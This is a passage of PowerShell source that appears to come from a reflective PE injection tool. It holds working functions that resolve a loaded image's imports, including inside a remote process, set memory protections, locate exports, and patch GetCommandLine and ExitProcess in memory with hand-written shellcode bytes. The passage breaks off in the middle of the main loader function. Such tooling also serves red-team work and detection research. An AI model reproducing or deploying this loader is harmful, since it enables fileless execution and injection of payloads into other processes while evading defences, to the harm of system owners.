                    #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
                    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }
            
            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }


    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )
        
        $RemoteLoading = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RemoteLoading = $true
        }
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
                Write-Verbose "Importing $ImportDllPath"
                
                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                    #Write-Verbose "Imported $ImportDllPath to remote process"
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                    #Write-Verbose "Imported $ImportDllPath"
                }

                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }
                
                #Get the first thunk, then loop through all of them
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                
                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
                    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
                    #   If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
                    #   and doing the comparison, just see if it is less than 0
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
                    }
                    
                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
                        
                    }
                    else
                    {
                        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
                    }
                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
                    
                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )
        
        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }
        
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }
        
        return $ProtectionFlag
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
            
            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize
            
            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }
    
    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )
        
        #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
        $ReturnArray = @() 
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0
        
        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }
        
        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        #################################################
        #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
        #   We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
    
        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
        }

        #Prepare the shellcode
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
        }
        $Shellcode1 += 0xb8
        
        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
        
        
        #Make copy of GetCommandLineA and GetCommandLineW
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

        #Overwrite GetCommandLineA
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        
        
        #Overwrite GetCommandLineW
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        #################################################
        
        
        #################################################
        #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
        #   I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
        #   It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
        #   argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
        $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
        
        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }
                
                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
                
                #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
                
                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
                
                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        #################################################
        
        
        #################################################
        #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

        $ReturnArray = @()
        $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
        
        #CorExitProcess (compiled in to visual studio c++)
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $ExitFunctions += $CorExitProcessAddr
        
        #ExitProcess (what non-managed programs use)
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $ExitFunctions += $ExitProcessAddr
        
        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            #The following is the shellcode (Shellcode: ExitThread.asm):
            #32bit shellcode
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            #64bit shellcode (Shellcode: ExitThread.asm)
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
            
            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            #Make copy of original ExitProcess bytes
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
            
            #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
            #   call ExitThread
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        #################################################

        Write-Output $ReturnArray
    }
    
    
    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
    #   It copies Count bytes from Source to Destination.
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
            
            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }


    #####################################
    ##########    FUNCTIONS   ###########
    #####################################
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )
        
        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Get the export table
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
        
        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            #AddressOfNames is an array of pointers to strings of the names of the functions exported
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {
                #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
                #    which contains the offset of the function in to the DLL
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }
        
        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExeArgs,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }
        
        #Get basic PE information
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $NXCompatible = $false
        }
        
        
        #Verify that the PE and the current process are the same bits (32bit or 64bit)
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }
            
            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }
            
            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }
            
            #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
